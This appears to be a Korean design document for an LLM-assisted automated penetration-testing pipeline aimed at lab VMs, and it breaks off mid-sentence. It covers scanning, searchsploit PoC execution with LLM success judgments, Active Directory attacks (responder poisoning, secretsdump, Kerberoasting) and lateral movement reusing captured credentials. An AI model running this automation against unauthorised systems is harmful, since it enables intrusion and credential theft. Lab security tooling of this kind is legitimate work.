# DESIGN.md — 설계 결정과 그 이유

`README.md`가 "어떻게 실행하는가"라면, 이 문서는 "왜 이렇게 구조를 잡았는가"를 기록한다.
나중에 구조가 이해 안 되면 이 문서부터 보면 된다. **설계 관련 대화가 있을 때마다 이 문서를
갱신한다** (사용자 요청).

## 1. 전체 아키텍처 — 확정

**독립 실행되는 Python 프로그램이 Anthropic API를 직접 호출한다.** Claude Code 같은
대화형 에이전트가 대신 몰아주는 구조가 아니다.

LLM 호출은 `anthropic` 파이썬 SDK로 `client.messages.create()`를 직접 부르는 방식을
쓴다 (Claude Agent SDK나 MCP 서버는 쓰지 않는다 — **확정**). 이유:

- 필요한 LLM 호출이 대부분 "구조화된 입력 → 구조화된 판정 1회 반환"이라 멀티턴
  에이전틱 루프가 필요 없다 (3절).
- `exploitation.py`의 후보 시도 순서는 파이썬 코드가 직접 제어한다(순차 실행) —
  모델이 "다음에 뭘 할지" 알아서 결정하게 하지 않는다.
- MCP는 프로세스 간 도구 노출용인데, 같은 파이썬 프로세스 안에서 함수를 직접
  호출하면 되는 걸 굳이 JSON-RPC로 감쌀 이유가 없다.
- 예외: worker가 판정 전에 read-only 프로브를 스스로 1~2회 해보고 싶은 경우엔
  Messages API의 `tool_use`만으로 충분하다 (Agent SDK 없이 직접 구현).

**전환 포인트**: 나중에 `exploitation.py`를 "실패하면 모델이 알아서 다른 접근을
시도"하는 방식으로 바꾸고 싶어지면, 그때 Claude Agent SDK + MCP로 전환.

## 2. 데이터 흐름

### 2-1. findings.jsonl
모든 모듈이 "발견하는 대로 즉시" append-only 이벤트 로그에 기록한다.
`state/<engagement_id>/findings.jsonl`, 한 줄에 이벤트 하나.

```jsonl
{"stage": "recon", "target": "192.168.56.104", "event": "host_discovered", "ts": "..."}
{"stage": "scanning", "target": "...", "event": "port_open", "port": 80, "service": "Apache 2.0.52", "ts": "..."}
{"stage": "scanning", "target": "...", "event": "platform_detected", "platform": "linux", "ts": "..."}
{"stage": "vuln_analysis", "target": "...", "event": "candidate_ranked", "cve": "...", "confidence": 0.8, "risk": "low", "rationale": "...", "ts": "..."}
{"stage": "exploitation", "target": "...", "event": "attempt_failed", "candidate": "...", "reason": "...", "ts": "..."}
{"stage": "exploitation", "target": "...", "event": "shell_obtained", "user": "apache", "ts": "..."}
{"stage": "post_exploit", "target": "...", "event": "privesc_success", "technique": "...", "user": "root", "ts": "..."}
{"stage": "flag_capture", "target": "...", "event": "flag_found", "path": "/root/root.txt", "privilege": "root", "ts": "..."}
```

`reporting.py`는 리스닝 서버가 아니라 이 파일을 읽어 타임라인으로 재구성하는
**일회성 함수**다. 인게이지먼트 도중 아무 때나 `python -m modules.reporting`을
실행하면 그 시점까지의 중간 리포트가 나온다.

### 2-2. credentials.jsonl (신규 — AD/멀티호스트 지원용) — 구현됨 (`core/state_store.py`)
리눅스 단일 박스에는 없던 개념. AD는 "크레덴셜 하나로 여러 호스트를 검증/재사용"이
기본 동작 단위라, 발견된 크레덴셜을 모든 모듈이 공유하는 별도 저장소가 필요하다.

findings.jsonl과 마찬가지로 **순수 append-only 이벤트 로그**로 구현했다 (최초 설계안은
`validated_on` 리스트를 나중에 덮어쓰는 식이었는데, 그러면 append-only 원칙이 findings와
credentials에서 서로 달라져서 일관성이 깨진다). "발견"과 "검증"을 별도 이벤트로 남기고,
`read_credentials()`가 이걸 현재 상태로 접어서(fold) 반환한다 — 파일 자체는 절대 다시
쓰지 않는다(크래시 안전성: 쓰다 중단돼도 마지막 줄만 깨지고 이전 기록은 멀쩡함).

```jsonl
{"event": "credential_discovered", "username": "jdoe", "domain": "corp.local", "secret": "...", "type": "password", "source": "sniffing:responder", "ts": "..."}
{"event": "credential_validated", "username": "jdoe", "domain": "corp.local", "target": "192.168.56.10", "ts": "..."}
```

`sniffing.py`(캡처), `exploitation.py`/`post_exploit.py`(덤프), `ad_enum.py`/
`lateral_movement.py`(재사용 검증)가 `append_credential_discovered()` /
`append_credential_validated()`로 쓰고, `read_credentials()`로 현재 상태를 읽는다.

### 2-3. core/ 패키지 — 인게이지먼트 공용 인프라 (구현됨)
```
core/
  engagement.py    # new_engagement_id(label) -> "20260808-143000-kioptrix2" 형태
  state_store.py    # append_finding/read_findings, append_credential_*/read_credentials
```
`env/`(호스트 프로비저닝)와 `modules/`(파이프라인 단계) 둘 다 이 패키지를 통해서만
상태를 읽고 쓴다. `state/<engagement_id>/`는 `core.engagement.engagement_dir()`가
없으면 자동 생성한다.

## 3. LLM이 필요한 지점 (직접 API 호출)

| 모듈 | 입력 | 출력 | 비고 |
|---|---|---|---|
| `vuln_analysis.py` | **Linux**: 서비스/버전 + searchsploit 후보 + nmap NSE 결과 / **AD**: BloodHound JSON + netexec enum 결과 + Kerberoasting/AS-REP roasting 대상자 목록 | 후보별 {confidence, risk, rationale} (AD는 공격 경로 형태) | 플랫폼별로 입력 소스가 다름 (7절) |
| `exploitation.py` | PoC 스크립트 실행 raw 출력 | {success, confidence, rationale} | 정규식으로 "성공 신호"를 정의하기보다 LLM이 임의의 출력 형식을 판정하는 게 안정적 (18절) |
| `post_exploit.py` | linpeas/winPEAS raw 출력 (AD는 로컬 admin 여부 + LSASS/SAM 덤프 가능성도 포함) | privesc 후보 우선순위 목록 | |
| `reporting.py` (선택) | findings.jsonl + credentials.jsonl 전체 | 서술형 요약 | 표/타임라인은 템플릿으로도 충분 |

`recon.py`, `scanning.py`, `flag_capture.py`, `shell_manager.py`, `ad_enum.py`,
`lateral_movement.py`, `sniffing.py`는 전부 결정론적(도구 실행 + 파싱)이라 LLM
호출이 없다 — 이 모듈들이 만들어낸 구조화된 결과를 `vuln_analysis`/`exploitation`/
`post_exploit`가 소비한다.

## 4. vuln_analysis.py — Supervisor/Worker 패턴

- **Worker**: 후보 하나를 받아 단발성 판정 1회로 끝낸다. 추가 조사가 필요하면
  read-only 프로브 최대 1~2회까지만 허용. 실제 검증(익스플로잇 시도)은 이 단계의
  역할이 아니다.
- **Supervisor**: 모든 worker 판정을 모아 confidence 내림차순 + risk 타이브레이커로
  최종 우선순위 리스트를 만든다.
- Worker 호출은 후보 개수만큼 병렬(`asyncio.gather`).

## 5. 병렬성 정책

| 단계 | 정책 | 이유 |
|---|---|---|
| `scanning.py` | 함수 자체는 대상 1개만 처리 | 모듈 안에 멀티 타겟 오케스트레이션을 넣지 않음(단순함 유지) |
| `scanning.py` 내부 서비스 서브모듈 | 병렬 | 서로 독립적 |
| `vuln_analysis.py` | 후보별 병렬(worker) + 취합은 순차(supervisor) | 읽기 전용이라 안전 |
| `exploitation.py` | 한 대상 안에서는 순차, 후보 우선순위대로, 기본 stop-at-first-success. 실패도 전부 로그 | 오래된/약한 박스가 동시 공격에 죽을 수 있음 |
| 여러 대상 간 exploitation | 병렬 가능 | 서로 다른 박스라 하나가 죽어도 무관 |
| `lateral_movement.py` (신규) | **대상 간 순차 권장** — 같은 크레덴셜로 여러 호스트를 짧은 시간에 두드리면 AD 계정 잠금(lockout) 위험 | 계정 잠금은 랩 전체를 못 쓰게 만드는 리스크라 병렬보다 안전 우선 |

`scanning.py`가 대상 1개만 처리하는 원칙과 AD의 "스코프 전체 순회" 필요성을 조율하는
건 `main.py`(오케스트레이터)의 역할이다 — `scope.yaml`을 순회하며 대상마다
`scanning.py`/`ad_enum.py`를 호출하고, `credentials.jsonl`을 모든 호출에 공유한다.

## 6. 안전장치 — 스냅샷/롤백

`exploitation.py` 진입 직전에 스냅샷:
```
VBoxManage snapshot <vm> take pre-exploit
```
롤백(스냅샷 복원은 VM이 꺼진 상태에서만 가능):
```
VBoxManage controlvm <vm> poweroff
VBoxManage snapshot <vm> restore pre-exploit
VBoxManage startvm <vm> --type headless
```
`env/provision_target.py`에 `snapshot_before_exploit()` / `rollback_to_snapshot()`로 추가 예정.

## 7. 플랫폼(Linux/Windows/AD) vs 타겟 개수 — 별개의 축, 자동 감지 — 확정

사용자가 처음부터 "이게 리눅스인지 AD인지, 단일인지 여러 대인지" 알고 시작한다는
전제가 성립하지 않는다(CTF/실전 모두 "알아내는 것"부터 시작). 그래서 전부 자동 감지.

- **플랫폼**: `scanning.py`가 nmap 결과로 판정(예: 88+389+445+3268 조합 → AD DC)해서
  `findings.jsonl`에 `platform: linux | windows_standalone | windows_ad`로 기록.
  이 필드로 `post_exploit.py`/`vuln_analysis.py`가 도구 세트를 분기한다.
- **타겟 개수**: `scope.yaml`에 몇 개가 있는지로 결정. AD는 구조적으로 멀티타겟일
  가능성이 높지만(도메인 컨트롤러 + 멤버 서버들), 반드시 그런 건 아니다(DC 한 대짜리
  AD 박스도 흔함) — 그래서 플랫폼 판정과 완전히 독립적으로 취급한다.
- 리포트에는 `platform`, `target_count`, 사용자가 붙이는 `label`(예: "Kioptrix2 -
  VulnHub")을 메타데이터로 기록해서 헤더에 노출한다.

## 8. AD/멀티호스트 지원 — MVP 승격 (사용자 최우선 요청)

처음엔 "Lateral movement"를 미래 스텁으로 분류했으나, **AD/멀티호스트 환경 지원은
MVP 필수 항목으로 승격**한다. 실전(회사 요청 등)에서 낮은 권한 도메인 크레덴셜
하나로 여러 서버를 다뤄야 하는 시나리오가 이 프로그램의 핵심 사용 사례 중 하나이기
때문.

### 8-1. 신규/승격 모듈과 사용 도구

Kali VM에 이미 설치되어 있는 걸 확인함 (2026-08-08 기준):
`netexec`(1.5.1), `bloodhound-python`, `impacket-secretsdump`,
`impacket-GetNPUsers`, `impacket-GetUserSPNs`, `responder`, `tshark`.
없는 것: `kerbrute`, `net-creds` (netexec/impacket/tshark로 대체 가능해서 필수 아님).

| 모듈 | 역할 | 도구 |
|---|---|---|
| `modules/sniffing.py` (스텁→**MVP**) | LLMNR/NBT-NS 포이즈닝으로 NTLM 해시 캡처, 평문 인증 캡처 | `responder`, `tshark` |
| `modules/ad_enum.py` (**신규**) | 도메인 구조/공유폴더/세션 enum, BloodHound 데이터 수집 | `netexec`(smb/ldap 모듈), `bloodhound-python` |
| `modules/lateral_movement.py` (스텁→**MVP**) | 크레덴셜로 다른 호스트 인증 검증 + 명령 실행, 새로 얻은 크레덴셜을 credentials.jsonl에 다시 기록 | `netexec --exec-method`, `impacket-secretsdump` |
| `vuln_analysis.py` (확장) | AD일 때는 searchsploit 대신 Kerberoasting/AS-REP roasting 대상자 탐색 | `impacket-GetUserSPNs`, `impacket-GetNPUsers` |

### 8-2. BloodHound — Neo4j 없이 JSON만

실제 Neo4j 그래프 DB/웹 UI는 MVP에서 뺀다. `bloodhound-python`으로 JSON 데이터만
수집해서 관계 정보를 텍스트로 LLM에 넘겨 공격 경로를 추론하게 한다. 이 프로그램은
사람이 그래프를 눈으로 탐색하는 도구가 아니라 자동화 파이프라인이므로, Neo4j 인프라
없이도 핵심 가치(공격 경로 파악)를 얻을 수 있다.

### 8-3. 계정 잠금(Lockout) 리스크

AD는 리눅스 단일 박스와 달리 **틀린 비밀번호 시도가 누적되면 계정이 잠긴다.**
`lateral_movement.py`/`ad_enum.py`가 크레덴셜을 여러 호스트에 검증할 때 이 리스크를
반드시 고려해야 한다 — 대상 간 순차 처리(5절)와 더불어, 나중에 시도 횟수 제한/딜레이
설정을 넣을 자리를 만들어둔다.

## 9. RAG — 지금은 인터페이스만 (확정)

`modules/knowledge_base.py`에 `retrieve(query: str) -> list[str]` 함수만 만들고,
MVP에서는 빈 리스트를 반환한다. `vuln_analysis`/`post_exploit`의 프롬프트 조립부에
"추가 컨텍스트: {retrieve(...)}" 자리를 미리 만들어둔다.

이유: 지금은 필요 없다(searchsploit/netexec/BloodHound가 이미 구조화된 검색
역할을 하고, 일반적인 privesc/AD 패턴은 모델이 학습 데이터로 이미 앎). 하지만
나중에 "회사 요청으로 분리망 안에서, 주어진 매뉴얼/가이드라인 문서를 참고해서 진행"
시나리오가 생기면 이미 완성된 LLM 호출 코드를 리팩터링해야 하는 비용이 인터페이스를
지금 만들어두는 비용보다 훨씬 크다. 그래서 자리만 선점해둔다.

**벡터 스토어는 LanceDB로 결정**(사용자 결정, 2026-08-11). 임베디드 방식(별도
서버 프로세스 없이 로컬 파일)이라, 이 프로젝트가 지금까지 지켜온 "별도 인프라
없이 로컬 파일로 해결" 방침(BloodHound를 Neo4j 없이 JSON만 쓴 것과 같은 이유
- 8-2절)과 맞아서 선택. 실제 구현 시 `state/` 밑에 로컬 LanceDB 파일로 둘 것.

## 10. MVP 범위 vs 스텁 (갱신)

| 포함 (MVP) | 스텁 (주석만) |
|---|---|
| 환경 프로비저닝(네트워크 자동 생성 포함), Recon, Scanning, Vuln Analysis(supervisor/worker, Linux+AD), Exploitation(순차+스냅샷), Post-Exploitation, Flag Capture, Reporting(pull 방식), **AD/멀티호스트 지원**(credentials.jsonl, sniffing.py, ad_enum.py, lateral_movement.py) | RAG 실제 구현(임베딩/벡터 검색 — 인터페이스는 MVP에 있음), 계정 잠금 방지용 시도 횟수 제한/딜레이 설정 |

## 11. 운영 노트 — guestcontrol 세션 정리

실제로 겪은 문제: 오래 걸리는 스캔(전체 포트 nmap, gobuster)을 호스트에서 강제
종료(`TaskStop` 등으로 `VBoxManage.exe` 프로세스 자체를 죽임)하면, 게스트(Kali) 쪽
프로세스/세션은 안 죽는다 — 하이퍼바이저 채널 특성상 호스트 프로세스를 죽여도
게스트에 신호가 전파되지 않는다. 그 상태로 두면 guestcontrol 세션이 "started"로
남아서, 이후 호출이 원인 불명의 에러(빈 stdout/stderr, 이상한 exit code)를 내기
시작한다.

**대응**: `env/guest_control.py`의 `run_in_kali()`가 자체 타임아웃에 걸리면
`close_all_sessions()`(`VBoxManage guestcontrol kali closesession --all`)를 자동
호출하도록 고쳤다. 하지만 **외부에서(bash `timeout` 명령, `TaskStop` 등) 강제
종료한 경우**는 이 자동 정리가 안 타므로, 사람이 직접 `close_all_sessions()`를
불러주거나 `VBoxManage guestcontrol kali closesession --all`을 실행해야 한다.
스캔을 수동으로 취소했다면 재시도 전에 반드시 이걸 먼저 하는 습관을 들일 것.

## 12. 장시간 명령 감시 — `env/job_runner.py`

### 문제
`run_in_kali()`는 명령 하나가 끝날 때까지 블로킹하고, 타임아웃되면 그냥 죽인다.
"왜 느린지"는 전혀 모르고, "느리지만 정상 진행 중"과 "멈춰버림"을 구분 못 한다.
스크립트/VM 연결이 끊겼다가 돌아와도 이전 작업이 어떻게 됐는지 알 방법이 없다.

### 해결 방식
`VBoxManage guestcontrol`에 필요한 게 다 있다:
- `start`: 블로킹 없이 명령을 던지고 바로 리턴 (`run`은 끝날 때까지 붙잡힘)
- `closeprocess <PID>`: 특정 프로세스 하나만 종료 (세션 전체를 미는 것보다 정밀함)

동작 방식:
1. `start_job()`: 명령을 게스트에서 논블로킹 실행. 출력은 게스트 파일로 리다이렉트,
   PID는 pidfile에 기록 (`echo $$ > pidfile; (명령) > outfile 2>&1; echo __JOB_EXIT__:$? >> outfile`)
2. `wait_for_job()`: 가벼운 폴링으로 살아있는지/끝났는지/진행되는지 확인. nmap에는
   `--stats-every 10s`를 붙여서 "X% done" 진행률을 출력에 남기고, 그 숫자가 여러 번
   폴링해도 안 바뀌면 정체 신호로 본다 (CPU 시간 기준보다 정확함 — nmap은 응답
   기다리며 원래 CPU를 거의 안 써서 CPU 기준이면 정상 동작도 오판함)
3. 정체된 것 같으면 대상에 ping을 보내 "대상이 죽어서 안 되는 건지" vs "그냥
   느린 건지" 진단 후 개입 여부 결정
4. 모든 상태 전이(job_started/job_progress/job_stalled/job_finished/
   guest_unreachable/job_hard_timeout)를 findings.jsonl에 기록 -> 별도 저장소 없이
   재시작/재연결 후 `resume_job()`으로 이전 작업을 이어서 찾을 수 있음
5. 호스트-게스트 연결 자체가 안 되는 경우(폴링 명령마저 타임아웃)는 "느림"이 아니라
   "끊김"으로 별도 기록하고, 더 느긋한 간격으로 재시도

### 실전에서 발견한 것: VirtualBox 가상 네트워크 자체의 간헐적 플레이키니스
전체 포트 스캔(`-p-`)을 이걸로 실제 검증하다가, nmap이 몇 초 만에 "0 hosts up"으로
잘못 판정하고 끝나버리는 걸 여러 번 봤다. `-sC`/`-sV`/`-T4`/`--stats-every` 여러
조합을 하나씩 빼며 원인을 찾으려 했으나 특정 플래그 문제가 아니었다 — 그 순간
`ping`을 쏴보면 RTT가 1ms~80ms까지 튀는 게 관찰됐고(호스트가 계속 무거운 작업 중),
`-Pn`을 줘도 로컬 이더넷에서는 ARP 해석이 필요해서 그 타이밍에 지연/손실이 나면
오판하는 것으로 보인다. recon.py가 이미 살아있다고 확인한 대상인데도 이런 거짓
음성(false negative)이 남았다.

**대응**: `full_port_scan()`이 "0 hosts up"을 받으면 바로 실패로 보지 않고, ping으로
즉시 재확인 후 최대 3회까지 재시도한다(`scan_false_negative_retry` 이벤트로 기록).
이건 job_runner가 원래 잡으려던 "멈춤"과는 다른 종류의 문제(멈춘 게 아니라 순간적으로
잘못된 결과를 내고 끝나버림)라, 별도의 재시도 로직으로 처리했다.

### 부수적으로 발견/수정한 것: nmap 2단계 스캔
같은 디버깅 과정에서, `-p-`(전체 포트) + `-sC`를 한 번에 돌리는 대신 (1) `-sV`로
전체 포트에서 열린 것만 먼저 찾고 (2) 찾은 포트에만 `-sC`를 돌리는 2단계로 바꿨다.
이건 원래 표준적인 방법론이기도 하고, 매번 65535개 포트 전체에 스크립트를 돌리는
비효율도 없앤다.

## 13. vuln_analysis.py 실전 검증하며 발견한 것

### searchsploit 쿼리가 너무 짧으면 프롬프트가 폭발함
rpcbind/status 같은 RPC 서비스는 배너가 `"2 (RPC #100000)"` 식으로 나온다. 괄호
이전까지만 검색어로 쓰는 로직(3절) 때문에 이게 그냥 `"2"` 한 글자가 됐고,
searchsploit이 사실상 DB 전체를 매칭시켜 **560만 토큰**짜리 결과를 만들어냈다
(모델 API가 100만 토큰 제한으로 즉시 거부함). `search_exploits()`에 최소 쿼리
길이(4자) 미달 시 스킵 + 매칭 개수 상한(15개)을 추가해서 막았다.

### subprocess 인코딩은 항상 명시해야 함
`env/*.py`의 `subprocess.run(..., text=True)` 호출들이 encoding을 안 정해서 파이썬이
로케일 기본값(Windows에서 cp1252)을 썼다. Git Bash로 실행할 땐 안 드러나다가
PowerShell에서 직접 실행하니 `UnicodeDecodeError`로 터졌다 — VBoxManage 출력은
UTF-8이라 cp1252로 디코딩하면 깨진다. `env/`의 모든 subprocess.run 호출에
`encoding="utf-8", errors="replace"`를 명시해서 고쳤다. **교훈: 파일이든
subprocess든 텍스트를 다루는 곳엔 항상 encoding="utf-8"을 명시할 것, 로케일 기본값에
의존하지 말 것.**

### PowerShell 셸 상태는 도구 호출 사이에 유지되지 않음
`$env:ANTHROPIC_API_KEY = "..."`를 한 번 실행하고 다음 호출에서 `python -m ...`을
돌리면 환경변수가 사라진다 — 각 PowerShell 도구 호출이 독립된 상태로 시작된다.
같은 명령 블록 안에서 설정과 실행을 함께 해야 한다.

## 14. API 사용 제한/허용범위

3단계로 나눠서 방어한다.

1. **계정 레벨(코드 밖)**: Anthropic Console에서 월 지출 한도 설정을 권장. 이
   프로젝트 전용 Workspace/키로 분리해서 다른 용도의 API 사용과 blast radius를
   격리하는 것도 권장 (사용자가 직접 설정, 코드가 강제할 수 없는 영역).
2. **동시 호출 수 제한**: `core/llm_guard.py`의 `CallBudget`이 `asyncio.Semaphore`로
   제어. vuln_analysis.py는 5로 확정 (사용자 확인).
3. **입력 크기 상한**: `core/llm_guard.py`의 `truncate()`. 프롬프트에 들어가는
   모든 텍스트 블록(searchsploit 결과, RAG 참고자료 등)에 일괄 적용 —
   "560만 토큰" 사고(13절) 재발 방지용 범용 안전장치. 앞으로 만들 `post_exploit.py`가
   linpeas 같은 대용량 출력을 다룰 때도 이걸 그대로 재사용한다.
4. **실행당 호출 횟수 상한(circuit breaker)**: `CallBudget.check()`가 요청 개수가
   상한(vuln_analysis.py는 50)을 넘으면 findings에 `llm_call_budget_exceeded`를
   남기고 즉시 중단.

**모델 선택**: worker(단발성 판정)에 Sonnet 5를 그대로 쓰기로 함 — 비용보다
판정 품질(오탐/누락이 실제 공격 시도로 이어지는 보안 도구 특성상)을 우선한다는
사용자 판단. Haiku로 전환하거나 단계별로 모델을 나누는 건 나중에 비용이 문제가
되면 재검토.

## 16. Claude Pro/Max 구독 우선 사용, 한도 걸리면 API로 자동 전환

목표: 사용자가 이미 내고 있는 Claude Pro/Max 구독을 먼저 쓰고, 구독 사용량 한도에
걸렸을 때만(그리고 리셋되기 전까지만) 종량제 API로 자동 전환한다.

### 구현: `core/llm_client.py`
- **구독 경로**: `claude` CLI를 headless(`-p --output-format json --max-turns 1`)로
  서브프로세스 실행. 인증은 `CLAUDE_CODE_OAUTH_TOKEN`(주의: 사용자가 준 자료엔
  `CLAUDE_CODE_OAUTHTOKEN`으로 언더스코어가 빠져 있었음 — `claude.exe` 바이너리를
  직접 실측해서 정확한 이름 확인함, `grep -a -o` 로 문자열 추출). 이 서브프로세스의
  환경에서 `ANTHROPIC_API_KEY`는 명시적으로 제거한다(있으면 구독 대신 종량제로
  샌다고 사용자가 제공한 자료에 명시됨).
- **한도 감지**: `claude.exe` 바이너리 안의 내부 에러 분류 정규식에 실제로
  `usage limit reached`라는 리터럴 문자열이 쓰이는 걸 확인함 -> 응답 텍스트에
  이 문구가 있거나 `is_error`가 true면 한도로 판단.
- **폴백 지속 시간**: 정확한 리셋 시각을 headless JSON 출력에서 안정적으로 얻을
  방법이 없어서(`resets_at` 값이 대화형 UI 쪽에만 노출되는 것으로 보임), 한도
  감지 시 `state/_subscription_limit.json`에 "이 시각까지는 API만 쓴다"를
  기록하는 방식으로 근사했다. 기본 30분 쿨다운, 지나면 다시 구독을 시도.
- **일반 API 경로**: 기존 `anthropic.Anthropic()` 동기 클라이언트. `claude` CLI가
  아예 없거나 토큰이 없는 경우도 조용히(로그만 남기고) 이쪽으로 폴백.

### vuln_analysis.py 리팩터링
기존엔 Anthropic SDK의 강제 `tool_choice`로 구조화된 JSON을 보장받았는데, `claude`
CLI headless 모드는 커스텀 tool 스키마를 노출하지 않아서 이 방식을 그대로 못 쓴다.
그래서 **프롬프트에 JSON 형식을 지시하고 응답을 파싱하는 방식**(`call_json()`)으로
바꿨다 — 엄격한 스키마 강제는 아니지만, 앞뒤에 설명이 섞여 나와도 첫 `{...}` 블록을
추출해서 파싱하도록 방어적으로 만들었다. 동시성도 `asyncio`(비동기 API 클라이언트
전제)에서 `ThreadPoolExecutor`(동기 서브프로세스 호출 전제)로 바꿨다 — `scanning.py`와
같은 패턴이라 코드베이스 일관성도 좋아짐.

## 16-1. 과금 인지 + 지출 상한 (core/spend_tracker.py)

사용자 요청: "종량제로 넘어갈 때 반드시 알려주고, 충전한 금액 이상 과금되지 않게
막아라." 두 가지로 구현:

- **인지**: `_call_via_api()`가 실행될 때마다(즉 종량제 경로를 탈 때마다) 이번 호출
  비용 추정치와 누적치를 콘솔에 출력한다. 구독 한도에 처음 걸리는 순간에는 별도로
  눈에 띄는 경고 블록을 출력한다.
- **상한**: Anthropic API는 "남은 잔액"을 조회하는 공식 방법이 없어서, 토큰 수 x
  공개 가격표로 계산한 **추정치** 기준의 소프트 가드레일이다. `.env`의
  `MAX_API_SPEND_USD`(기본 $5)를 넘으면 그 다음 호출부터 `SpendCapExceededError`로
  막는다 — 상한을 막 넘긴 그 호출 자체는 못 막지만(호출 전엔 정확한 비용을 모름),
  다음 호출부터는 확실히 막힌다. **진짜 하드 스톱은 Anthropic Console의 지출
  한도(14절)이고, 이건 보완용 2차 방어선**이라는 걸 사용자에게 계속 안내할 것.
- **상한의 의미**: 사용자 확인 — "전체 기간 누적 총합"이 아니라 "구독이 막혀서
  종량제로 돌던 한 구간(limited window)당 예산"이다. 구독 한도가 리셋돼서 다시
  구독 경로를 쓸 수 있게 되면(`_is_subscription_limited()`가 만료를 감지하는 시점)
  `spend_tracker.reset()`으로 누적치를 0으로 되돌리고 다음 구간을 위해 다시 $5를
  쓸 수 있게 한다.

**범용 패턴으로 기억해둘 것** (사용자 요청, 이 프로젝트 밖에서도 적용): "구독 우선
+ 한도 도달 시에만 과금 API로 폴백 + 전환 시 사용자에게 명확히 알림 + 로컬 추정
지출 상한으로 하드 스톱"은 Claude API를 쓰는 모든 프로젝트에 재사용할 수 있는
비용 안전 패턴이다.

## 18. exploitation.py — msfconsole 수정 완료, Metasploit 경로 추가 예정

**업데이트 (2026-08-09, 같은 날 안에 해결됨)**: 아래에 원래 "MVP는 Metasploit
없이"라고 적었던 결정을 뒤집었다. 이 VM에서 막고 있던 디렉터리 3개를 전부 고쳐서
`msfconsole -q -x "version; exit"`이 정상 동작하는 것까지 확인했다
(`Framework: 6.4.135-dev`). 실제 수정 내용:

1. `sudo chmod 755 /usr/lib/mysql/plugin/auth_pam_tool_dir` (권한 문제)
2. `sudo chmod 755 /etc/ssl/private` (`/usr/lib/ssl/private`는 이 경로의 심볼릭
   링크) — 이 디렉터리엔 `ssl-cert-snakeoil.key`(더미 테스트 인증서)만 있고
   **파일 자체 권한(0640)은 안 건드렸음**, 디렉터리 목록 권한만 열어서 안전함.
3. **진짜 원인은 llvm-21 패키지 자체였다**: `apt install --reinstall llvm-21`은
   증상을 못 고쳤다 — `/usr/lib/llvm-21/build/Debug+Asserts -> ..`,
   `/usr/lib/llvm-21/build/Release -> ..` 가 **자기 부모 디렉터리를 가리키는
   심볼릭 링크**로, llvm-21 패키지가 원래 이렇게 배포된다(오래된 LLVM
   autotools 빌드 트리 레이아웃과의 호환용 레거시 별칭으로 추정 — 손상이
   아니라 패키지의 의도된 구조). `sudo rm` 으로 이 두 심볼릭 링크만 제거해서
   해결. (`include`/`lib`/`share` 심볼릭 링크는 형제 디렉터리를 가리켜서
   순환이 없으므로 안 건드림.)

**다음 TODO**: `exploitation.py`에 실제 Metasploit 실행 경로를 추가한다
(msfconsole -x 스크립팅 또는 msfrpcd+pymetasploit3 RPC — DESIGN.md 원래 계획은
RPC였으나, 이 코드베이스가 이미 `job_runner.py`로 CLI 도구를 안정적으로 감시하는
패턴을 쓰고 있어서 msfconsole -x 쪽이 아키텍처 일관성이 더 좋을 수 있음, 재검토
필요).

### 원래 문제 기록 (아래는 해결 전 작성한 내용, 배경 이해용으로 남겨둠)

### msfconsole이 Kali에서 안 뜨는 문제
`exploitation.py`를 Metasploit RPC(`msfrpcd`+`pymetasploit3`) 기반으로 만들려 했으나,
`msfconsole` 자체가 이 Kali VM에서 시작이 안 됐다. 원인을 깊게 파본 결과:

- Metasploit이 부팅 속도 개선을 위해 `bootsnap`(Ruby 로딩 캐시 라이브러리)을
  도입했다([PR #17809](https://github.com/rapid7/metasploit-framework/pull/17809),
  **2023-04 머지 — 최근 변경이 아니라 3년 전부터 있던 코드**. 처음에 "최근 회귀"라고
  잘못 판단했다가 PR/이슈 날짜를 실제로 확인하고 정정함).
- `config/boot.rb`가 `Bootsnap.setup(ignore_directories: [], ...)`을 **하드코딩**해서
  직접 호출한다 — `DISABLE_BOOTSNAP`/`BOOTSNAP_IGNORE_DIRECTORIES` 같은 표준
  bootsnap 환경변수가 전혀 안 먹힌다(그건 `Bootsnap.default_setup`에서만 읽는데,
  Metasploit은 그 경로를 안 씀).
- bootsnap이 Ruby 로드 경로를 재귀적으로 스캔하다가 권한 제한/손상된 디렉터리를
  만나면 그대로 죽는다. 실제로 `/usr/lib/mysql/plugin/auth_pam_tool_dir`(권한),
  `/usr/lib/ssl/private`(권한, 원래 root 전용이라 chmod로 열면 안 됨),
  `/usr/lib/llvm-21/.../build/...`(심볼릭 링크 순환, ELOOP — chmod로 못 고침) 세
  개를 순서대로 만남.
- 같은 계열의 문제를 보고한 이슈들도 있다: rapid7/metasploit-framework
  [#18422](https://github.com/rapid7/metasploit-framework/issues/18422)(2023-10),
  [#18536](https://github.com/rapid7/metasploit-framework/issues/18536)(2023-11) —
  둘 다 2023년, 즉 이것도 최근 신고가 아니라 3년째 미해결 상태. **하지만 이게
  "모든 Kali에서 항상 이렇다"는 뜻은 아니다** — 3년 내내 보편적으로 깨져 있었다면
  Metasploit 자체가 진작 못 쓰는 도구 취급받았을 것. 우리가 만난 구체적인 원인
  (mysql/ssl 디렉터리 권한, llvm-21 심볼릭 링크 손상)은 **이 VM의 패키지 설치
  이력에 특정된 것일 가능성이 높다** — 예: `apt upgrade`로 llvm 패키지가 갱신되며
  깨진 심볼릭 링크가 남았을 수 있음. 그래서 "다른 Kali 환경에서도 항상 이럴 것"이라고
  일반화하면 안 되고, **이 VM 한정 이슈일 수 있다는 걸 전제로** 아래 결정을 내렸다.

**결정 (사용자 확인)**: 이 VM에서 이 버그를 더 우회하는 데 시간을 쓰지 않고, MVP는
Metasploit 없이 진행한다. **TODO — 나중에 업데이트할 것**: 다른 Kali 환경(또는
이 VM을 재설치한 환경)에서 `msfconsole -q -x "version; exit"`이 정상 동작하는지
먼저 확인하고, 되면 `exploitation.py`에 Metasploit RPC 경로를 추가한다. 안 되면
llvm 패키지 재설치(`apt install --reinstall llvm-21`)나 Kali 재설치를 고려. 관련
이슈 링크는 위에 남겨둠.

### 실제 구현: 단독 PoC 스크립트 + LLM 판정
- `vuln_analysis.py`가 남긴 `candidate_ranked` 이벤트(searchsploit 매칭)를 순서대로
  읽어서, 실행 가능한 스크립트(.py/.pl/.rb/.sh)가 있는 후보만 추린다.
- `searchsploit -m`이 아니라 `cp`로 직접 파일을 Kali 작업 디렉터리에 복사(경로를
  이미 알고 있어서 -m 검색이 불필요) 후, 대상 IP를 유일한 인자로 넘겨서 실행
  (가장 흔한 PoC 관례 — 스크립트마다 인자 형식이 달라서 100% 보장은 못 함, 알려진
  한계로 명시).
- **성공 판정도 LLM에게 맡긴다**: PoC 실행 결과(raw stdout/stderr)를 통째로 LLM에
